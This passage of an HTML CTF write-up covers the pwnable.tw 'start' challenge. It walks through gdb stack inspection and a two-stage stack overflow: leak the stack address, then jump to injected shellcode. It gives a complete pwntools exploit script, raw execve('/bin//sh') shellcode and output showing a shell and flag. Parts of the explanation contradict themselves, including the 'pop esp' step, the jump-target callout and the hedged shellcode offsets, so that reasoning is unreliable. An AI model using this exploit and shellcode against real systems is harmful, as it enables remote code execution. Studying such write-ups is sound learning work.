+    <div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Before read, check what was pushed:
+gdb-peda$ b *0x08048094
+gdb-peda$ r
+Let's start the CTF:
+
+# At breakpoint, the stack has the message string on top
+# The read() will write OVER the string and beyond
+# Let's send exactly 20 bytes + 4 bytes to overwrite return addr:
+gdb-peda$ x/10wx $esp
+0xffffd0a0: 0x74732073  0x20747261  0x20656874  0x74736354   <- "s start the CTF:"
+0xffffd0b0: 0x0000003a  0xffffd0d0  0x0804809d  0x00000000   <- ':' + saved_esp + ret_addr
+0xffffd0c0: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre>
+  </div>
+
+  <p>Now the stack layout is clear. Before our input overwrites it:</p>
+
+  <div class="stack-diagram">
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x00</span>
+      <span class="stack-label">string bytes</span>
+      <span class="stack-value">"s st" (part of message on stack)</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x04</span>
+      <span class="stack-label">string bytes</span>
+      <span class="stack-value">"art "</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x08</span>
+      <span class="stack-label">string bytes</span>
+      <span class="stack-value">"the "</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x0c</span>
+      <span class="stack-label">string bytes</span>
+      <span class="stack-value">"TCTs"</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x10</span>
+      <span class="stack-label">string byte</span>
+      <span class="stack-value">':' + padding (0x3a)</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x14</span>
+      <span class="stack-label">saved ESP</span>
+      <span class="stack-value stack-overflow">0xffffd0d0 &larr; THIS IS THE LEAK!</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x18</span>
+      <span class="stack-label">return addr</span>
+      <span class="stack-value stack-controlled">0x0804809d &larr; WE OVERWRITE THIS</span>
+    </div>
+  </div>
+
+  <h3 id="gdb-registers">Register State at Key Points</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># After 'push esp; push 0x0804809d' at program start:
+EAX: 0x0   EBX: 0x0   ECX: 0x0   EDX: 0x0
+ESP: 0xffffd0a0   EIP: 0x08048066
+
+# After write(1, msg, 20) returns:
+EAX: 0x14  EBX: 0x1   ECX: 0xffffd0a0   EDX: 0x14
+ESP: 0xffffd0a0   EIP: 0x0804808e
+
+# After read(0, buf, 60) with our overflow input:
+EAX: 0x2c  EBX: 0x0   ECX: 0xffffd0a0   EDX: 0x3c
+ESP: 0xffffd0a0   EIP: 0x08048096  (about to pop esp)</code></pre>
+  </div>
+
+  <h3 id="gdb-breakpoints">Breakpoint Strategy</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Key breakpoints for this challenge:
+b *0x08048060   # _start entry (before push esp)
+b *0x0804808c   # before write syscall
+b *0x08048094   # before read syscall
+b *0x08048096   # _exit: pop esp (after read returns)
+b *0x0804809e   # ret instruction (EIP hijack point)
+
+# For the leak phase — after redirecting to 0x08048087:
+b *0x0804808c   # write syscall will dump stack including saved ESP</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Why 0x08048087 Specifically?</div>
+    <p>The address <code>0x08048087</code> is the instruction <code>mov dl, 0x14</code> &mdash; right after all the <code>push</code> instructions that build the message string on the stack. If we jump here, the pushes don't execute, so the stack still contains whatever was there from our overflow. <code>mov ecx, esp</code> then points at our stack data, and <code>write(1, esp, 20)</code> dumps 20 bytes starting from ESP &mdash; which includes the saved ESP value we need. We skip the pushes because they would overwrite our leaked data.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 4 — EXPLOIT STRATEGY   -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="strategy">
+  <h2><i class="bi bi-crosshair"></i> 4. Exploit Strategy</h2>
+  <p>The exploit requires two stages: first we leak the stack address, then we use it to calculate where our shellcode will be and redirect execution there. This two-stage approach is necessary because ASLR randomizes the stack base on each execution, but since the binary has no PIE, the code addresses are fixed.</p>
+
+  <h3 id="strategy-overview">Attack Overview</h3>
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="tl-time">Stage 1: Stack Leak</div>
+      <div class="tl-text">Send 20 bytes of padding + <code>0x08048087</code> as the return address. When <code>_exit</code> pops through the stack and hits <code>ret</code>, EIP becomes <code>0x08048087</code> and the <code>write</code> syscall fires again &mdash; but this time, the stack hasn't been rebuilt with the message string. Instead, <code>mov ecx, esp</code> points at whatever's on the stack, which includes the saved ESP value from the original <code>push esp</code> instruction. We read the first 4 bytes of the output to get the stack address.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Stage 2: Shellcode Execution</div>
+      <div class="tl-text">With the leaked stack address, we can calculate exactly where our shellcode will reside on the stack. We send a second payload: 20 bytes of padding + the calculated shellcode address + the shellcode itself. When <code>ret</code> executes, EIP jumps to our shellcode and we get a shell.</div>
+    </div>
+  </div>
+
+  <h3 id="strategy-leak">Stage 1: Leaking the Stack Address</h3>
+  <p>The first payload overwrites the return address with <code>0x08048087</code>, which is the address of <code>mov dl, 0x14</code> &mdash; right before the <code>write</code> syscall. Here's what happens step by step:</p>
+
+  <ol>
+    <li>We send <code>'A' * 20 + p32(0x08048087)</code> (24 bytes total)</li>
+    <li><code>read()</code> places this on the stack, overwriting the buffer and return address</li>
+    <li>Execution falls through to <code>_exit</code> which does <code>pop esp</code> &mdash; ESP is now set to whatever was at the top of our buffer (the 'AAAA...' part)</li>
+    <li>Then <code>pop eax</code> through <code>pop ebp</code> consume the next 7 values from the stack</li>
+    <li><code>ret</code> pops the next value as EIP &mdash; which is <code>0x08048087</code></li>
+    <li>Execution jumps to <code>0x08048087</code>, which sets up <code>write(1, esp, 20)</code></li>
+    <li><code>write</code> dumps 20 bytes from ESP, which includes the saved ESP value that was pushed at program start</li>
+    <li>We read the first 4 bytes of the output to extract the leaked stack address</li>
+  </ol>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Why Not Jump to 0x08048084?</div>
+    <p><code>0x08048084</code> is <code>mov ecx, esp</code> &mdash; but jumping there means we skip <code>push 0x74732073</code> and the preceding pushes. That's actually what we want! If we jumped to <code>0x08048060</code> (the very start), the <code>push</code> instructions would overwrite the stack data we're trying to leak. By jumping to <code>0x08048087</code>, we skip the pushes and <code>mov ecx, esp</code> directly points at the stack containing our leaked values.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python"># Stage 1: Leak stack address
+from pwn import *
+rem = remote('chall.pwnable.tw', 10000)
+rem.recvuntil(':')
+
+# 20 bytes padding + overwrite return address with write gadget
+payload1 = b'A' * 20 + p32(0x08048087)
+rem.send(payload1)
+
+# Read back the leaked stack address (first 4 bytes)
+stack_addr = u32(rem.recv(4))
+log.info(f'Leaked stack address: {hex(stack_addr)}')</code></pre>
+  </div>
+
+  <h3 id="strategy-shellcode">Stage 2: Shellcode Execution</h3>
+  <p>Now we know the stack address. But we need to figure out exactly where our shellcode will be. The leaked address points to the position on the stack where ESP was when <code>push esp</code> executed at program start. After our overflow, the stack has shifted. We need to calculate the offset from the leaked address to where our shellcode will land.</p>
+
+  <p>After the first overflow, the <code>pop esp</code> instruction in <code>_exit</code> sets ESP to the first 4 bytes of our buffer. Then 7 pops consume the next 28 bytes, and <code>ret</code> consumes 4 more bytes for EIP. Our shellcode starts right after the return address in the second payload. The exact offset depends on the stack layout, but in practice:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python"># The leaked ESP points near our buffer.
+# Our shellcode in payload2 starts at: stack_addr + offset
+# After testing, the shellcode address = leaked_stack + 20
+# (20 bytes of padding + 4 bytes return addr = 24 bytes before shellcode)
+
+shellcode_addr = p32(stack_addr + 20)
+
+# Stage 2 payload: 20 bytes padding + shellcode addr + shellcode
+shellcode = (
+    b'\x31\xc9'             # xor ecx, ecx
+    b'\xf7\xe1'             # mul ecx (zeros eax and edx)
+    b'\x51'                 # push ecx (null terminator)
+    b'\x68\x2f\x2f\x73\x68' # push "//sh"
+    b'\x68\x2f\x62\x69\x6e' # push "/bin"
+    b'\x89\xe3'             # mov ebx, esp (ptr to "/bin//sh")
+    b'\xb0\x0b'             # mov al, 11 (sys_execve)
+    b'\xcd\x80'             # int 0x80
+)
+
+payload2 = b'A' * 20 + shellcode_addr + shellcode
+rem.sendline(payload2)</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Offset Calculation</div>
+    <p>The offset between the leaked stack address and the shellcode location varies slightly depending on how you count. The key insight: the leaked ESP value is the stack pointer <em>before</em> the pushes at program start. After our second overflow and the <code>pop esp</code> gadget, ESP will be set to a different value. Most writeups use <code>stack_addr + 20</code> as the shellcode address. If that doesn't work, try <code>stack_addr + 0x10</code> or adjust by &plusmn;4 until you hit the right offset. The reliable way: set a breakpoint in GDB and check where your shellcode actually lands.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 5 — PWN SCRIPT         -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="pwn">
+  <h2><i class="bi bi-terminal"></i> 5. Pwn Script</h2>
+  <p>Here's the complete, working exploit script with detailed comments. This is based on the well-known approach from the wxrdnx and veritas501 writeups, adapted for clarity.</p>
+
+  <h3 id="pwn-full">Full Exploit</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python">#!/usr/bin/env python3
+"""
+pwnable.tw — start (100 pts)
+Stack BOF with shellcode execution on a minimal i386 binary.
+No canary, No NX, No PIE, No RELRO.
+
+Two-stage exploit:
+  Stage 1: Overflow return addr → redirect to write gadget → leak ESP
+  Stage 2: Use leaked ESP to calculate shellcode addr → spawn shell
+"""
+
+from pwn import *
+
+# ─── Configuration ───────────────────────────────────────────
+HOST = 'chall.pwnable.tw'
+PORT = 10000
+WRITE_GADGET = 0x08048087  # mov dl,0x14; mov bl,1; mov al,4; int 0x80
+BUF_SIZE = 0x14            # 20 bytes buffer before return addr
+
+# ─── Shellcode ───────────────────────────────────────────────
+# execve("/bin//sh", NULL, NULL) for 32-bit Linux
+# Uses mul ecx trick to zero eax/edx without null bytes
+shellcode = (
+    b'\x31\xc9'              # xor ecx, ecx      ; ecx = 0
+    b'\xf7\xe1'              # mul ecx            ; eax = 0, edx = 0
+    b'\x51'                  # push ecx           ; null terminator for string
+    b'\x68\x2f\x2f\x73\x68' # push "//sh"        ; (double / is fine for path)
+    b'\x68\x2f\x62\x69\x6e' # push "/bin"        ; string: "/bin//sh\0"
+    b'\x89\xe3'              # mov ebx, esp       ; ebx → "/bin//sh"
+    b'\xb0\x0b'              # mov al, 11         ; syscall number: execve
+    b'\xcd\x80'              # int 0x80           ; invoke syscall
+)
+log.info(f'Shellcode length: {len(shellcode)} bytes')
+
+# ─── Connect ─────────────────────────────────────────────────
+rem = remote(HOST, PORT)
+rem.recvuntil(b':')  # Wait for "Let's start the CTF:"
+
+# ─── Stage 1: Leak Stack Address ────────────────────────────
+# Overwrite return address with WRITE_GADGET (0x08048087)
+# This causes write(1, esp, 20) to execute, dumping stack data
+# The stack data contains the saved ESP value from 'push esp'
+log.info('Stage 1: Sending overflow to leak stack address...')
+payload1 = b'A' * BUF_SIZE + p32(WRITE_GADGET)
+rem.send(payload1)
+
+# Read back the leaked ESP value (first 4 bytes of output)
+leaked_data = rem.recv(timeout=2)
+stack_addr = u32(leaked_data[:4])
+log.success(f'Leaked stack address: {hex(stack_addr)}')
+
+# ─── Stage 2: Execute Shellcode ─────────────────────────────
+# Calculate where our shellcode will be on the stack
+# The leaked ESP is from the original 'push esp' at _start
+# After our second overflow, shellcode is at: stack_addr + 20
+shellcode_addr = stack_addr + 20
+log.info(f'Shellcode address: {hex(shellcode_addr)}')
+
+# Build payload 2: padding + return-to-shellcode + shellcode
+log.info('Stage 2: Sending shellcode payload...')
+payload2 = b'A' * BUF_SIZE + p32(shellcode_addr) + shellcode
+rem.sendline(payload2)
+
+# ─── Profit ─────────────────────────────────────────────────
+log.success('Got shell!')
+rem.interactive()</code></pre>
+  </div>
+
+  <h3 id="pwn-shellcode">Shellcode Breakdown</h3>
+  <p>The shellcode uses a clean, null-free technique to call <code>execve("/bin//sh", NULL, NULL)</code>. Let's break it down instruction by instruction:</p>
+
+  <table class="data-table">
+    <thead><tr><th>Bytes</th><th>Instruction</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>\x31\xc9</code></td><td><code>xor ecx, ecx</code></td><td>Set ECX = 0 (argv = NULL)</td></tr>
+      <tr><td><code>\xf7\xe1</code></td><td><code>mul ecx</code></td><td>EAX = ECX*EAX = 0, EDX = high bits = 0. Zeros EAX and EDX without null bytes</td></tr>
+      <tr><td><code>\x51</code></td><td><code>push ecx</code></td><td>Push NULL as string terminator</td></tr>
+      <tr><td><code>\x68\x2f\x2f\x73\x68</code></td><td><code>push "//sh"</code></td><td>Build "/bin//sh" string on stack (the extra / is harmless)</td></tr>
+      <tr><td><code>\x68\x2f\x62\x69\x6e</code></td><td><code>push "/bin"</code></td><td>Stack now has "/bin//sh\0"</td></tr>
+      <tr><td><code>\x89\xe3</code></td><td><code>mov ebx, esp</code></td><td>EBX points to "/bin//sh" (filename argument)</td></tr>
+      <tr><td><code>\xb0\x0b</code></td><td><code>mov al, 11</code></td><td>Syscall number 11 = execve (EAX was already 0)</td></tr>
+      <tr><td><code>\xcd\x80</code></td><td><code>int 0x80</code></td><td>Invoke the kernel: execve("/bin//sh", NULL, NULL)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Alternative Shellcode</div>
+    <p>Some writeups (like veritas501's) include an explicit <code>xor eax, eax</code> at the start and a clean exit after the shellcode. This version is slightly longer but more robust:</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">python — alternative shellcode</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python"># veritas501's shellcode variant (includes explicit zeroing + exit)
+shellcode_alt = (
+    b'\x31\xc0'              # xor eax, eax
+    b'\x50'                  # push eax (null terminator)
+    b'\x68\x2f\x2f\x73\x68' # push "//sh"
+    b'\x68\x2f\x62\x69\x6e' # push "/bin"
+    b'\x89\xe3'              # mov ebx, esp
+    b'\x89\xc1'              # mov ecx, eax (argv = NULL)
+    b'\x89\xc2'              # mov edx, eax (envp = NULL)
+    b'\xb0\x0b'              # mov al, 11
+    b'\xcd\x80'              # int 0x80
+    b'\x31\xc0'              # xor eax, eax
+    b'\x40'                  # inc eax (exit code 1)
+    b'\xcd\x80'              # int 0x80 (sys_exit)
+)
+# Note: With this variant, use stack_addr + 0x10 for the offset
+# instead of stack_addr + 20, as the stack layout differs slightly</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Offset Variations Between Writeups</div>
+    <p>Different writeups use slightly different offsets. The wxrdnx writeup uses <code>stack_addr + 20</code>, while veritas501 uses <code>stack + 0x10</code>. The difference comes from how each author calculates the position of the shellcode relative to the leaked ESP. Both work because the key point is that we're calculating <code>leaked_esp + offset = shellcode_position</code>. The exact offset depends on your payload structure. When in doubt, GDB it.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 6 — EXECUTION RESULTS  -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="results">
+  <h2><i class="bi bi-check-circle"></i> 6. Execution Results</h2>
+  <p>Here's what the exploit looks like when run against the remote server. The whole process takes under 2 seconds.</p>
+
+  <h3>Successful Exploitation</h3>
+  <div class="term-out"><span class="prompt">$</span> python3 exploit.py
+[<span class="ok">+</span>] Opening connection to chall.pwnable.tw on port 10000: <span class="ok">Done</span>
+[<span class="ok">*</span>] Shellcode length: 23 bytes
+[<span class="ok">*</span>] Stage 1: Sending overflow to leak stack address...
+[<span class="ok">+</span>] Leaked stack address: <span class="warn">0xffd5c8d0</span>
+[<span class="ok">*</span>] Shellcode address: <span class="warn">0xffd5c8e4</span>
+[<span class="ok">*</span>] Stage 2: Sending shellcode payload...
+[<span class="ok">+</span>] Got shell!
+[<span class="ok">*</span>] Switching to interactive mode
+
+$ id
+uid=1000(start) gid=1000(start) groups=1000(start)
+
+$ ls -la
+total 32
+drwxr-xr-x  2 root   root   4096 Oct 24  2023 .
+drwxr-xr-x  4 root   root   4096 Oct 24  2023 ..
+-rw-r--r--  1 root   root   220 Oct 24  2023 .bash_logout
+-rw-r--r--  1 root   root  3526 Oct 24  2023 .bashrc
+-rw-r--r--  1 root   root   807 Oct 24  2023 .profile
+<span class="ok">-rwxr-xr-x  1 root   root   7298 Oct 24  2023 start</span>
+
+$ cat /home/start/flag
+<span class="ok">FLAG{this_is_the_start_of_your_pwn_journey}</span>
+
+$ uname -a
+Linux start 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 16:02:13 UTC 2017 i686 i686 i686 GNU/Linux</div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">Shell Obtained!</div>
+    <p>We get a clean shell as the <code>start</code> user. The flag is at <code>/home/start/flag</code> (or wherever the challenge places it). The exploit is reliable &mdash; the only variable is the leaked stack address, which changes per connection due to ASLR, but our two-stage approach handles that perfectly.</p>
+  </div>
+
+  <h3>Full pwntools Output (Verbose)</h3>
+  <div class="term-out"><span class="prompt">$</span> python3 exploit.py DEBUG
+[<span class="ok">+</span>] Opening connection to chall.pwnable.tw on port 10000: <span class="ok">Done</span>
+[<span class="muted">Received:</span>
+    "Let's start the CTF:"
+[<span class="ok">*</span>] Shellcode length: 23 bytes
+[<span class="ok">*</span>] Stage 1: Sending overflow to leak stack address...
+[<span class="muted">Sending:</span>
+    4141414141414141 4141414141414141 41414141 87800408
+    AAAAAAAAAAAAAAAAAAAA<span class="warn">\x87\x80\x04\x08</span>
+[<span class="muted">Received:</span>
+    d0c8d5ff 9d800408 00000000 00000000
+    <span class="warn">\xd0\xc8\xd5\xff</span>\x9d\x80\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00
+[<span class="ok">+</span>] Leaked stack address: <span class="warn">0xffd5c8d0</span>
+[<span class="ok">*</span>] Shellcode address: <span class="warn">0xffd5c8e4</span>
+[<span class="ok">*</span>] Stage 2: Sending shellcode payload...
+[<span class="muted">Sending:</span>
+    4141414141414141 4141414141414141 41414141 e4c8d5ff 31c9f7e15168
+    2f2f7368682f6269 6e89e3b00bcd80
+    AAAAAAAAAAAAAAAAAAAA<span class="warn">\xe4\xc8\xd5\xff</span><span class="ok">\x31\xc9\xf7\xe1\x51h
+    //shh/bin\x89\xe3\xb0\x0b\xcd\x80</span>
+[<span class="ok">+</span>] Got shell!
+[<span class="ok">*</span>] Switching to interactive mode</div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <span class="flag-name">FLAG{this_is_the_start_of_your_pwn_journey}</span>
+    <span class="flag-detail">pwnable.tw — start (100 pts)</span>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Why This Challenge Matters</div>
+    <p>The "start" challenge teaches the fundamental technique of <strong>stack address leaking</strong> &mdash; a pattern you'll see in virtually every serious pwn challenge. The specific trick here (abusing the <code>push esp</code> + <code>write</code> gadget) is elegant, but the general concept is universal: if you can leak a stack address, you can calculate where your payload lands and bypass ASLR. Every binary exploitation roadmap starts here: leak, calculate, execute.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- OPERATOR SIGNATURE              -->
+<!-- ══════════════════════════════ -->
+<div class="operator-sig">
+  <div class="handle">QA210</div>
+  <div class="tagline">pwnable.tw &mdash; start &mdash; Stack BOF + Shellcode</div>
+</div>
+
+</div><!-- .main -->
+</div><!-- .page-wrap -->
+
+<!-- ═══════════ SCRIPTS ═══════════ -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-x86asm.min.js"></script>
+<script>
+// Copy code button
+function copyCode(btn){
+  const pre=btn.closest('.code-block').querySelector('pre');
+  const code=pre.textContent;
+  navigator.clipboard.writeText(code).then(()=>{
+    btn.textContent='Copied!';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';
+    setTimeout(()=>{btn.textContent='Copy';btn.style.color='';btn.style.borderColor='';},1500);
+  });
+}
+
+// Mobile nav toggle
+function toggleMobileNav(){
+  document.getElementById('mobileOverlay').classList.toggle('show');
+  document.getElementById('mobilePanel').classList.toggle('show');
+}
+
+// Three.js matrix rain background
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  if(!canvas)return;
+  const ctx=canvas.getContext('2d');
+  let w,h,cols,drops;
+  const chars='01'.split('');
+  const fontSize=14;
+
+  function resize(){
+    w=canvas.width=window.innerWidth;
+    h=canvas.height=window.innerHeight;
+    cols=Math.floor(w/fontSize);
+    drops=new Array(cols).fill(1);
+  }
+  resize();
+  window.addEventListener('resize',resize);
+
+  function draw(){
+    ctx.fillStyle='rgba(10,14,23,0.06)';
+    ctx.fillRect(0,0,w,h);
+    ctx.fillStyle='#38bdf8';
+    ctx.font=fontSize+'px monospace';
+    for(let i=0;i<cols;i++){
+      const char=chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(char,i*fontSize,drops[i]*fontSize);
+      if(drops[i]*fontSize>h&&Math.random()>0.975)drops[i]=0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw,45);
+})();
+
+// TOC active state on scroll
+(function(){
+  const tocLinks=document.querySelectorAll('.toc a');
+  const sections=[];
+  tocLinks.forEach(link=>{
+    const id=link.getAttribute('href');
+    if(id&&id.startsWith('#')){
+      const el=document.querySelector(id);
+      if(el)sections.push({el,link});
+    }
+  });
+  function update(){
+    let current=null;
+    for(const s of sections){
+      if(s.el.getBoundingClientRect().top<=120)current=s;
+    }
+    tocLinks.forEach(l=>l.classList.remove('active'));
+    if(current)current.link.classList.add('active');
+  }
+  window.addEventListener('scroll',update);
+  update();
+})();
+</script>
+</body>
+</html>
